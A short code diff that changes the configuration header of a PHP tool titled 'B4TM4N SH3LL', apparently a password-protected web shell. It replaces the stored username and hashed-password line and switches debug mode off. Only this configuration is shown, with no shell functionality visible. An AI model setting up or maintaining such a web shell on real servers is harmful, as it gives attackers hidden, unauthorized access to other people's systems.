@@ -13,12 +13,12 @@
  *
 */
 
-$x="BCM8:6b0916e774b3f6a142c84fb1bee1afb14f49e882"; // B64E('user') : sha1(md5('pass'))
+$x="zaIgxSRawZ==:42b378d7eb719b4ad9c908601bdf290d541c9c3a"; // B64E('user') : sha1(md5('pass'))
 
 $config=[
 	"title"   => "B4TM4N SH3LL", // Title
 	"version" => "2.4",          // Version
-	"debug"   => true            // Debug Mode
+	"debug"   => false           // Debug Mode
 ];
 
 $account=explode(':',$x);
